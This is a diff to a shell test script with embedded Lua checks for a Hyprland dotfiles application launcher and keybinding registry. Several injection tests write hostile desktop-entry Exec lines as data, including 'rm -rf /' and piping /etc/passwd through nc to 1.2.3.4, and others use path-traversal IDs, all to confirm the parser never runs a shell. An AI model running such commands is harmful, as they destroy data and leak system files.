@@ -460,15 +460,15 @@ local manifest = require("keybindings_manifest")
 local def_fm = eff.resolve_role_default("file-manager")
 local argv_def = eff.get_action_argv("file_manager", manifest)
 
--- Thunar override via environment
-eff.resolve_role_default = function() return "thunar" end
+-- Thunar override via role resolution
+eff.resolve_role_default = function() return "thunar.desktop", { command_argv = { "gtk-launch", "--", "thunar.desktop" }, desktop_id = "thunar.desktop" } end
 local argv_thunar = eff.get_action_argv("file_manager", manifest)
 
-print(string.format("FM: def=%s def_cmd=%s thunar_cmd=%s", def_fm, argv_def[1], argv_thunar[1]))
+print(string.format("FM: def=%s def_launcher=%s def_target=%s thunar_launcher=%s thunar_target=%s", def_fm, argv_def[1], argv_def[3], argv_thunar[1], argv_thunar[3]))
 LUA_CHECK
 )"
-if grep -q "FM: def=nautilus def_cmd=nautilus thunar_cmd=thunar" <<< "$role_fm_out"; then
-    pass "11.1 file manager role resolves dynamically (Nautilus vs Thunar) without mutating shortcut declaration"
+if grep -q "FM: def=nautilus def_launcher=gtk-launch def_target=org.gnome.Nautilus.desktop thunar_launcher=gtk-launch thunar_target=thunar.desktop" <<< "$role_fm_out"; then
+    pass "11.1 file manager role resolves dynamically (Nautilus vs Thunar) via gtk-launch without mutating shortcut declaration"
 else
     fail "11.1 file manager dynamic resolution failed: $role_fm_out"
 fi
@@ -483,14 +483,14 @@ local manifest = require("keybindings_manifest")
 local def_term = eff.resolve_role_default("terminal")
 local argv_def = eff.get_action_argv("terminal", manifest)
 
-eff.resolve_role_default = function() return "foot" end
+eff.resolve_role_default = function() return "foot.desktop", { command_argv = { "gtk-launch", "--", "foot.desktop" }, desktop_id = "foot.desktop" } end
 local argv_foot = eff.get_action_argv("terminal", manifest)
 
-print(string.format("TERM: def=%s def_cmd=%s foot_cmd=%s", def_term, argv_def[1], argv_foot[1]))
+print(string.format("TERM: def=%s def_launcher=%s def_target=%s foot_launcher=%s foot_target=%s", def_term, argv_def[1], argv_def[3], argv_foot[1], argv_foot[3]))
 LUA_CHECK
 )"
-if grep -q "TERM: def=kitty def_cmd=kitty foot_cmd=foot" <<< "$role_term_out"; then
-    pass "11.2 terminal role resolves dynamically (Kitty vs Foot) without mutating shortcut declaration"
+if grep -q "TERM: def=kitty def_launcher=gtk-launch def_target=kitty.desktop foot_launcher=gtk-launch foot_target=foot.desktop" <<< "$role_term_out"; then
+    pass "11.2 terminal role resolves dynamically (Kitty vs Foot) via gtk-launch without mutating shortcut declaration"
 else
     fail "11.2 terminal dynamic resolution failed: $role_term_out"
 fi
@@ -505,40 +505,51 @@ local manifest = require("keybindings_manifest")
 local def_browser = eff.resolve_role_default("browser")
 local argv_def = eff.get_action_argv("browser", manifest)
 
-eff.resolve_role_default = function() return "firefox" end
+eff.resolve_role_default = function() return "firefox.desktop", { command_argv = { "gtk-launch", "--", "firefox.desktop" }, desktop_id = "firefox.desktop" } end
 local argv_ff = eff.get_action_argv("browser", manifest)
 
-print(string.format("BROWSER: def=%s def_cmd=%s ff_cmd=%s", def_browser, argv_def[1], argv_ff[1]))
+print(string.format("BROWSER: def=%s def_launcher=%s def_target=%s ff_launcher=%s ff_target=%s", def_browser, argv_def[1], argv_def[3], argv_ff[1], argv_ff[3]))
 LUA_CHECK
 )"
-if grep -q "BROWSER: def=chromium-browser def_cmd=chromium-browser ff_cmd=firefox" <<< "$role_browser_out"; then
-    pass "11.3 browser role resolves dynamically (Chromium vs Firefox) without mutating shortcut declaration"
+if grep -q "BROWSER: def=chromium-browser def_launcher=gtk-launch def_target=chromium-browser.desktop ff_launcher=gtk-launch ff_target=firefox.desktop" <<< "$role_browser_out"; then
+    pass "11.3 browser role resolves dynamically (Chromium vs Firefox) via gtk-launch without mutating shortcut declaration"
 else
     fail "11.3 browser dynamic resolution failed: $role_browser_out"
 fi
 
-# 11.4: Specific unbound application actions exist, are editable, and return structured command_argv
-role_unbound_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
+# 11.4: Discovered applications do not pollute the action catalogue into fake unbound actions; static catalogue actions eliminated
+cat_elim_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
 local root = arg[1]
 package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
 local eff = require("effective_bindings")
 local manifest = require("keybindings_manifest")
+eff.get_user_actions_path = function() return "/nonexistent/user_actions.json" end
 
-local actions = { "terminal.kitty", "terminal.foot", "files.nautilus", "files.thunar", "browser.chromium", "browser.firefox" }
-local ok_count = 0
-for _, act in ipairs(actions) do
-    local argv = eff.get_action_argv(act, manifest)
-    if argv and #argv > 0 then
-        ok_count = ok_count + 1
+-- Verify static catalogue actions are absent from manifest
+local legacy_actions = { "terminal.kitty", "terminal.foot", "files.nautilus", "files.thunar", "browser.chromium", "browser.firefox" }
+local present_count = 0
+for _, b in ipairs(manifest.bindings or {}) do
+    for _, leg in ipairs(legacy_actions) do
+        if b.id == leg then present_count = present_count + 1 end
     end
 end
-print(string.format("UNBOUND: count=%d/%d", ok_count, #actions))
+
+-- Verify resolving effective bindings does not include un-added installed apps as unbound actions
+local effective = eff.resolve_bindings(manifest, {})
+local unadded_app_present = false
+for _, b in ipairs(effective.bindings or {}) do
+    if b.id and b.id:match("^app:") then
+        unadded_app_present = true
+    end
+end
+
+print(string.format("CATALOGUE: legacy_present=%d unadded_present=%s", present_count, tostring(unadded_app_present)))
 LUA_CHECK
 )"
-if grep -q "UNBOUND: count=6/6" <<< "$role_unbound_out"; then
-    pass "11.4 specific unbound application actions exist and return structured command_argv"
+if grep -q "CATALOGUE: legacy_present=0 unadded_present=false" <<< "$cat_elim_out"; then
+    pass "11.4 static application catalogue eliminated; discovered apps do not pollute unbound actions"
 else
-    fail "11.4 specific unbound application actions check failed: $role_unbound_out"
+    fail "11.4 catalogue elimination check failed: $cat_elim_out"
 fi
 
 # 11.5: desktop.conf drives role default resolution when env is not set
@@ -583,20 +594,32 @@ local root = arg[1]
 package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
 local reg = require("application_registry")
 
--- Test safe exec line parsing
-local argv1 = reg.parse_exec_line('custom-editor %U --profile "My Work" %F')
-assert(argv1 and #argv1 == 3, "Argv parsing failed, length: " .. tostring(argv1 and #argv1 or 0))
-assert(argv1[1] == "custom-editor" and argv1[2] == "--profile" and argv1[3] == "My Work", "Argv elements mismatch")
+local tmp = os.tmpname() .. ".desktop"
+local f = io.open(tmp, "w")
+f:write("[Desktop Entry]\n")
+f:write("Type=Application\n")
+f:write("Name=Test Tool\n")
+f:write("Exec=test-tool %U --flag 'dangerous; rm -rf /' %F\n")
+f:write("Icon=test-tool\n")
+f:write("Categories=Utility;\n")
+f:close()
 
--- Test Exec parser security: no eval/sh -c
-local argv_meta = reg.parse_exec_line('sh -c "echo injection"; rm -rf /')
-assert(argv_meta[1] == "sh" and argv_meta[2] == "-c", "Parser altered literal words")
+local parsed = reg.parse_desktop_file(tmp, "test-tool.desktop")
+os.remove(tmp)
+
+assert(parsed ~= nil, "parse_desktop_file returned nil")
+assert(parsed.name == "Test Tool", "Name mismatch: " .. tostring(parsed.name))
+assert(parsed.desktop_id == "test-tool.desktop", "desktop_id mismatch")
+assert(parsed.icon == "test-tool", "Icon mismatch")
+assert(parsed.exec == "test-tool %U --flag 'dangerous; rm -rf /' %F", "Exec metadata altered")
+assert(parsed.command == "gtk-launch -- test-tool.desktop", "Command mismatch: " .. tostring(parsed.command))
+assert(type(parsed.command_argv) == "table" and parsed.command_argv[1] == "gtk-launch" and parsed.command_argv[2] == "--" and parsed.command_argv[3] == "test-tool.desktop", "command_argv mismatch")
 
 print("APP_REG_SAFE")
 LUA_CHECK
 )"
 if grep -q "APP_REG_SAFE" <<< "$app_reg_test_out"; then
-    pass "12.2 application_registry strips Freedesktop field codes and parses arguments safely without eval"
+    pass "12.2 application_registry separates discovery metadata from launch and delegates execution to gtk-launch"
 else
     fail "12.2 application_registry parser check failed: $app_reg_test_out"
 fi
@@ -753,4 +776,251 @@ if grep -q 'text: "Bound (" + keybindingsModel.boundCount + ")"' "$qml_window" &
     pass "12.7 KeybindingsWindow provides Bound/Unbound tabs, Tab view switching, and Alt+A application picker"
 else
     fail "12.7 KeybindingsWindow missing Bound/Unbound tabs or keyboard view switching"
+fi
+
+section "13. Security Hardening, Platform Launcher Delegation, and Fail-Closed Invariants"
+
+# 13.1: Desktop Entry Exec Shell Injection Immunity
+test_13_1_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
+local root = arg[1]
+package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
+local reg = require("application_registry")
+
+local tmp = os.tmpname() .. ".desktop"
+local f = io.open(tmp, "w")
+f:write("[Desktop Entry]\n")
+f:write("Type=Application\n")
+f:write("Name=Exploit Test\n")
+f:write("Exec=evil_binary $(touch /tmp/pwned_test) ; rm -rf / ; cat /etc/passwd | nc 1.2.3.4 80 > /dev/null &\n")
+f:write("Icon=security-high\n")
+f:close()
+
+local parsed = reg.parse_desktop_file(tmp, "exploit.desktop")
+os.remove(tmp)
+
+assert(parsed ~= nil, "parse_desktop_file failed")
+assert(parsed.command == "gtk-launch -- exploit.desktop", "command mismatch")
+assert(#parsed.command_argv == 3, "command_argv length mismatch")
+assert(parsed.command_argv[1] == "gtk-launch" and parsed.command_argv[2] == "--" and parsed.command_argv[3] == "exploit.desktop")
+assert(not io.open("/tmp/pwned_test", "r"), "Shell injection occurred during parse!")
+print("TEST_13_1_OK")
+LUA_CHECK
+)"
+if grep -q "TEST_13_1_OK" <<< "$test_13_1_out"; then
+    pass "13.1 desktop entry parsing has zero shell execution and strictly delegates to gtk-launch"
+else
+    fail "13.1 shell injection immunity test failed: $test_13_1_out"
+fi
+
+# 13.2: Missing Default Application Handling & Fail-Closed Policy B
+test_13_2_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
+local root = arg[1]
+package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
+local eff = require("effective_bindings")
+local reg = require("application_registry")
+local manifest = require("keybindings_manifest")
+
+-- 1. Test missing configured app with recommended app available (kitty is installed)
+local tmp_conf = os.tmpname()
+local f = io.open(tmp_conf, "w")
+f:write("terminal.default = nonexistent_terminal_xyz\n")
+f:close()
+
+reg.get_desktop_config_path = function() return tmp_conf end
+reg.invalidate_cache()
+
+local canon, info = reg.resolve_role("terminal")
+os.remove(tmp_conf)
+assert(canon == "kitty", "Expected fallback to recommended kitty, got: " .. tostring(canon))
+assert(info ~= nil and info.desktop_id == "kitty.desktop")
+
+-- 2. Test missing configured app AND missing recommended app (fail closed, no fake record)
+reg.find_application = function(id) return nil end
+reg.invalidate_cache()
+
+local canon2, info2 = reg.resolve_role("terminal")
+assert(canon2 == nil, "Expected nil when all options missing, got: " .. tostring(canon2))
+assert(info2 ~= nil and type(info2) == "string", "Expected error message as second return value")
+
+local argv, err = eff.get_action_argv("terminal", manifest)
+assert(argv == nil, "get_action_argv should fail closed when role app is unavailable")
+assert(err:find("not available"), "Error message mismatch: " .. tostring(err))
+
+local effective = eff.resolve_bindings(manifest, {})
+local term_item = nil
+for _, b in ipairs(effective.bindings) do
+    if b.id == "terminal" then term_item = b break end
+end
+assert(term_item ~= nil, "terminal binding missing in effective")
+assert(term_item.runnable == false, "term_item should be marked unrunnable")
+assert(term_item.command == nil, "term_item.command should be nil")
+assert(term_item.description:find("%(unavailable%)"), "term_item.description should indicate unavailable")
+
+print("TEST_13_2_OK")
+LUA_CHECK
+)"
+if grep -q "TEST_13_2_OK" <<< "$test_13_2_out"; then
+    pass "13.2 Policy B: missing default falls back to Recommended; missing Recommended fails closed without fake synthesis"
+else
+    fail "13.2 fail-closed Policy B test failed: $test_13_2_out"
+fi
+
+# 13.3: Production Environment Override Lockdown
+test_13_3_out="$(env -u WORKSTATION_TEST_MODE DEFAULT_TERMINAL=foot TERMINAL=foot DEFAULT_FILE_MANAGER=thunar DEFAULT_BROWSER=firefox "$lua_bin" - "$ROOT" <<'LUA_CHECK'
+local root = arg[1]
+package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
+local reg = require("application_registry")
+reg.invalidate_cache()
+
+local canon_term, info_term = reg.resolve_role("terminal")
+local canon_fm, info_fm     = reg.resolve_role("file-manager")
+local canon_br, info_br     = reg.resolve_role("browser")
+
+assert(canon_term ~= "foot" and info_term.desktop_id ~= "foot.desktop", "DEFAULT_TERMINAL override leaked into production!")
+assert(canon_fm ~= "thunar" and info_fm.desktop_id ~= "thunar.desktop", "DEFAULT_FILE_MANAGER override leaked into production!")
+assert(canon_br ~= "firefox" and info_br.desktop_id ~= "org.mozilla.firefox.desktop", "DEFAULT_BROWSER override leaked into production!")
+
+print("PROD_LOCKDOWN_OK")
+LUA_CHECK
+)"
+if grep -q "PROD_LOCKDOWN_OK" <<< "$test_13_3_out"; then
+    pass "13.3 environment overrides strictly locked down outside WORKSTATION_TEST_MODE=1"
+else
+    fail "13.3 production environment lockdown failed: $test_13_3_out"
+fi
+
+# 13.4: Strict Fail-Closed user_actions.json Parser Negative Test Matrix
+test_13_4_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
+local root = arg[1]
+package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
+local eff = require("effective_bindings")
+
+local function must_fail(str, desc)
+    local res, err = eff.parse_strict_user_actions(str)
+    assert(res == nil, "Expected failure for: " .. desc .. ", got success: " .. tostring(res))
+    assert(err ~= nil and #err > 0, "Expected error message for: " .. desc)
+end
+
+-- 1. Non-object root
+must_fail("[]", "array root")
+must_fail('"hello"', "string root")
+must_fail("123", "number root")
+must_fail("true", "boolean root")
+
+-- 2. Missing or invalid version
+must_fail('{"actions": []}', "missing version")
+must_fail('{"version": 2, "actions": []}', "unsupported version 2")
+must_fail('{"version": "1", "actions": []}', "string version")
+
+-- 3. Missing or invalid actions
+must_fail('{"version": 1}', "missing actions")
+must_fail('{"version": 1, "actions": "app.desktop"}', "string actions")
+must_fail('{"version": 1, "actions": 123}', "number actions")
+
+-- 4. Malformed desktop IDs in actions
+must_fail('{"version": 1, "actions": ["../evil.desktop"]}', "path traversal ../")
+must_fail('{"version": 1, "actions": ["foo/../../bar.desktop"]}', "nested path traversal")
+must_fail('{"version": 1, "actions": ["-rf.desktop"]}', "leading dash")
+must_fail('{"version": 1, "actions": ["app_without_extension"]}', "missing .desktop")
+must_fail('{"version": 1, "actions": ["bad name;.desktop"]}', "semicolon in desktop ID")
+
+-- 5. Trailing garbage
+must_fail('{"version": 1, "actions": []} trailing', "trailing garbage")
+must_fail('{"version": 1, "actions": []},', "trailing comma")
+
+-- 6. Payload bounding (> 64KB)
+local huge_payload = '{"version": 1, "actions": [' .. string.rep('"a.desktop",', 6000) .. '"b.desktop"]}'
+assert(#huge_payload > 65536)
+must_fail(huge_payload, "oversized payload > 64KB")
+
+-- 7. Valid payload with escapes and UTF-8
+local valid_json = '{\n  "version": 1,\n  "actions": [\n    "\\u0061pp.desktop",\n    "second-app.desktop"\n  ]\n}'
+local parsed, p_err = eff.parse_strict_user_actions(valid_json)
+assert(parsed ~= nil, "Failed to parse valid json: " .. tostring(p_err))
+assert(#parsed.actions == 2)
+assert(parsed.actions[1] == "app.desktop", "Escape decoding failed")
+assert(parsed.actions[2] == "second-app.desktop")
+
+-- 8. Deduplication
+local dup_json = '{"version": 1, "actions": ["app.desktop", "app.desktop"]}'
+local p_dup = eff.parse_strict_user_actions(dup_json)
+assert(p_dup ~= nil and #p_dup.actions == 1, "Duplicate action not deduplicated")
+
+print("STRICT_PARSER_OK")
+LUA_CHECK
+)"
+if grep -q "STRICT_PARSER_OK" <<< "$test_13_4_out"; then
+    pass "13.4 user_actions.json parser enforces strict fail-closed schema, bounds, and traversal safety"
+else
+    fail "13.4 strict user_actions parser negative matrix failed: $test_13_4_out"
+fi
+
+# 13.5: XDG Desktop Identity, Subdirectory Derivation, and Precedence Masking
+test_13_5_out="$("$lua_bin" - "$ROOT" <<'LUA_CHECK'
+local root = arg[1]
+package.path = root .. "/dotfiles/hypr/?.lua;" .. package.path
+local reg = require("application_registry")
+
+-- 1. Subdirectory desktop ID derivation
+local did1 = reg.derive_desktop_id("/usr/share/applications", "/usr/share/applications/sub/app.desktop")
+local did2 = reg.derive_desktop_id("/usr/share/applications", "/usr/share/applications/org/gnome/Software.desktop")
+local did3 = reg.derive_desktop_id("/usr/share/applications", "/usr/share/applications/kitty.desktop")
+assert(did1 == "sub-app.desktop", "Expected sub-app.desktop, got: " .. tostring(did1))
+assert(did2 == "org-gnome-Software.desktop", "Expected org-gnome-Software.desktop, got: " .. tostring(did2))
+assert(did3 == "kitty.desktop", "Expected kitty.desktop, got: " .. tostring(did3))
+
+-- 2. TryExec checking
+local tmp_try = os.tmpname() .. ".desktop"
+local f = io.open(tmp_try, "w")
+f:write("[Desktop Entry]\nType=Application\nName=TryExec Test\nExec=try-test\nTryExec=/nonexistent/binary_xyz_123\n")
+f:close()
+local parsed_te = reg.parse_desktop_file(tmp_try, "try-test.desktop")
+os.remove(tmp_try)
+assert(parsed_te == nil, "parse_desktop_file should reject non-existent TryExec")
+
+-- 3. Hidden=true masking
+local tmp_dir = os.tmpname() .. "_dir"
+os.execute("mkdir -p " .. tmp_dir .. "/user/applications " .. tmp_dir .. "/sys/applications")
+
+local f_sys = io.open(tmp_dir .. "/sys/applications/test-masked.desktop", "w")
+f_sys:write("[Desktop Entry]\nType=Application\nName=System App\nExec=sys-app\n")
+f_sys:close()
+
+local f_user = io.open(tmp_dir .. "/user/applications/test-masked.desktop", "w")
+f_user:write("[Desktop Entry]\nType=Application\nName=System App\nHidden=true\n")
+f_user:close()
+
+local prev_dirs = reg.get_applications_search_dirs
+reg.get_applications_search_dirs = function()
+    return { tmp_dir .. "/user/applications", tmp_dir .. "/sys/applications" }
+end
+reg.invalidate_cache()
+
+local found = reg.find_application("test-masked.desktop")
+reg.get_applications_search_dirs = prev_dirs
+reg.invalidate_cache()
+os.execute("rm -rf " .. tmp_dir)
+
+assert(found == nil, "Hidden=true user entry failed to mask lower-precedence system entry")
+
+print("XDG_IDENTITY_OK")
+LUA_CHECK
+)"
+if grep -q "XDG_IDENTITY_OK" <<< "$test_13_5_out"; then
+    pass "13.5 XDG desktop identity: subdirectory derivation, TryExec checking, and Hidden=true masking"
+else
+    fail "13.5 XDG desktop identity test failed: $test_13_5_out"
+fi
+
+# 13.6: Aurelia Keybindings Primary S and U Keys & Search Input Separation
+if grep -q 'focus: true' "$qml_window" &&
+   grep -q 'event.key === Qt.Key_S' "$qml_window" &&
+   grep -q 'event.key === Qt.Key_U' "$qml_window" &&
+   grep -q 'text: "S"' "$qml_window" &&
+   grep -q 'text: "U"' "$qml_window" &&
+   ! grep -q 'text: "Alt+S"' "$qml_window" &&
+   ! grep -q 'text: "Alt+U"' "$qml_window"; then
+    pass "13.6 KeybindingsWindow uses primary S and U shortcuts with separated search input focus"
+else
+    fail "13.6 primary S and U shortcut configuration incomplete in KeybindingsWindow"
 fi
